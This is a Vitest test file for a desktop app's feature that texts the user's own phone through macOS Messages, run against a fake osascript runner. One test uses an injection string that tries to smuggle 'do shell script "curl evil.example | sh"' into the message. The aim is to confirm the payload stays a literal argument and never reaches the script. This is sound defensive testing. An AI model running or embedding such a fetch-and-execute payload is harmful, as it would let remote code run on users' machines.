// Texts to the user's own phone through Messages, with a fake osascript runner: nothing is ever sent.
import { describe, expect, it } from "vitest";
import { createSelfText, SelfTextSettingSchema, type SelfTextSetting } from "../../apps/desktop/src/main/self-text";

const OWN = "+15551234567";

function fakeMessages(initial?: SelfTextSetting, failure?: { stderr?: string; killed?: boolean }) {
  let stored = initial;
  const runs: { file: string; args: string[]; timeout: number }[] = [];
  const texts = createSelfText({
    run: async (file, args, { timeout }) => {
      runs.push({ file, args, timeout });
      if (failure) throw Object.assign(new Error("Command failed"), failure);
    },
    load: () => stored,
    save: (setting) => void (stored = setting),
  });
  // The script is the source; everything after "--" is data the script receives as argv.
  const argv = (i = 0) => runs[i]!.args.slice(runs[i]!.args.indexOf("--") + 1);
  const source = (i = 0) => runs[i]!.args.slice(0, runs[i]!.args.indexOf("--")).join("\n");
  return { texts, runs, argv, source, stored: () => stored };
}

describe("own handle setting", () => {
  it("accepts an international phone number or an email, and nothing else", () => {
    for (const handle of [OWN, "+447911123456", "me@icloud.com"]) {
      expect(SelfTextSettingSchema.safeParse({ enabled: true, handle }).success).toBe(true);
    }
    for (const handle of ["", "5551234567", "+0123456", "+1 555 123 4567", "-e", "me", "a@b", "+15551234567, +15557654321", "x".repeat(300) + "@icloud.com"]) {
      expect(SelfTextSettingSchema.safeParse({ enabled: true, handle }).success, handle).toBe(false);
    }
    expect(SelfTextSettingSchema.safeParse({ enabled: "yes", handle: OWN }).success).toBe(false);
    expect(SelfTextSettingSchema.safeParse({ enabled: true, handle: OWN, recipients: ["+15557654321"] }).success).toBe(false);
  });

  it("is off with no handle until the user saves one; saving persists it locally", () => {
    const m = fakeMessages();
    expect(m.texts.get()).toEqual({ enabled: false, handle: "" });
    expect(m.texts.set({ enabled: true, handle: OWN })).toEqual({ enabled: true, handle: OWN });
    expect(m.stored()).toEqual({ enabled: true, handle: OWN });
    expect(() => m.texts.set({ enabled: true, handle: "not a number" })).toThrow();
    expect(m.stored()).toEqual({ enabled: true, handle: OWN });
  });
});

describe("sending through Messages", () => {
  it("runs osascript with the handle and text as run-handler arguments, with a timeout", async () => {
    const m = fakeMessages({ enabled: true, handle: OWN });
    expect(await m.texts.sendNudge("Send the deck to Bob.")).toBe("sent");
    expect(m.runs).toHaveLength(1);
    expect(m.runs[0]!.file).toBe("/usr/bin/osascript");
    expect(m.runs[0]!.timeout).toBeGreaterThan(0);
    expect(m.source()).toMatch(/on run argv/);
    expect(m.argv()).toEqual([OWN, "Send the deck to Bob. Open TARS to finish it together."]);
  });

  it("hostile text stays a literal argument and never reaches the script source", async () => {
    const hostile = `Pay "Bob" \\ now\nline two" & (do shell script "curl evil.example | sh") & "`;
    const m = fakeMessages({ enabled: true, handle: OWN });
    await m.texts.sendNudge(hostile);
    expect(m.argv()).toEqual([OWN, `${hostile} Open TARS to finish it together.`]);
    expect(m.source()).not.toContain("do shell script");
    expect(m.source()).not.toContain("Bob");
    expect(m.source()).not.toContain(OWN);
    // The source is the same fixed script whatever the text.
    const plain = fakeMessages({ enabled: true, handle: OWN });
    await plain.texts.sendNudge("hello");
    expect(m.source()).toBe(plain.source());
  });

  it("the send path cannot be given another recipient", async () => {
    const m = fakeMessages({ enabled: true, handle: OWN });
    const loose = m.texts as unknown as Record<"sendNudge" | "sendTest", (...args: unknown[]) => Promise<unknown>>;
    await loose.sendNudge("Hi", "+15557654321", { handle: "+15557654321" });
    await loose.sendTest("+15557654321");
    expect(m.runs.map((_, i) => m.argv(i)[0])).toEqual([OWN, OWN]);
    expect(JSON.stringify(m.runs)).not.toContain("+15557654321");
  });

  it("does nothing while off, and the test text goes only to the saved handle with a fixed sentence", async () => {
    const off = fakeMessages({ enabled: false, handle: OWN });
    expect(await off.texts.sendNudge("Send the deck.")).toBe("off");
    expect(off.runs).toEqual([]);
    expect(await off.texts.sendTest()).toBe("sent");
    expect(off.argv()).toEqual([OWN, "This is a test text from TARS. Nudges you turn on will look like this."]);
    await expect(fakeMessages().texts.sendTest()).rejects.toThrow(/number/);
  });

  // Apple Event result codes (Apple's MacErrors.h / AppleEvents docs): -1743 errAEEventNotPermitted is
  // what osascript prints when the user refused (or turned off) Automation for Messages; -1744
  // errAEEventWouldRequireUserConsent when macOS could not ask. "TARS: no iMessage account" is raised by our own script.
  it.each([
    ["execution error: Not authorized to send Apple events to Messages. (-1743)", "not-permitted"],
    ["execution error: Not authorized to send Apple events to Messages. (-1744)", "not-permitted"],
    ["execution error: TARS: no iMessage account (1)", "no-messages-account"],
    ["execution error: Messages got an error: Can't get participant (-1728)", "failed"],
    ["", "failed"],
  ] as const)("maps %j to %s", async (stderr, result) => {
    const m = fakeMessages({ enabled: true, handle: OWN }, { stderr });
    expect(await m.texts.sendNudge("x")).toBe(result);
    expect(m.texts.get()).toMatchObject({ lastNudge: result });
  });

  it("a timed-out send is failed", async () => {
    const m = fakeMessages({ enabled: true, handle: OWN }, { killed: true });
    expect(await m.texts.sendTest()).toBe("failed");
  });
});

describe("the closing recap text", () => {
  const recap = {
    done: { items: ["Sent AI Guides report, 12:41 AM"], more: 0 },
    parked: { items: [], more: 0 },
    left: { items: ["Mail outside@example.com via https://evil.example", "B"], more: 2 },
  };

  it("sends the recap once, as one plain message, only to the saved handle", async () => {
    const m = fakeMessages({ enabled: true, handle: OWN });
    expect(await m.texts.sendRecap(recap)).toBe("sent");
    expect(m.runs).toHaveLength(1);
    expect(m.argv()).toEqual([
      OWN,
      [
        "TARS · done for now",
        "Done:",
        "- Sent AI Guides report, 12:41 AM",
        "Parked:",
        "- Nothing parked.",
        "Left:",
        "- Mail [address] via [link]",
        "- B",
        "- and 2 more",
      ].join("\n"),
    ]);
    expect(m.texts.get()).toMatchObject({ lastRecap: "sent" });
  });

  it("does nothing while off, and an honest result when Messages refuses", async () => {
    const off = fakeMessages({ enabled: false, handle: OWN });
    expect(await off.texts.sendRecap(recap)).toBe("off");
    expect(off.runs).toEqual([]);
    expect(await fakeMessages(undefined).texts.sendRecap(recap)).toBe("off");
    const refused = fakeMessages({ enabled: true, handle: OWN }, { stderr: "Not authorized to send Apple events to Messages. (-1743)" });
    expect(await refused.texts.sendRecap(recap)).toBe("not-permitted");
  });
});
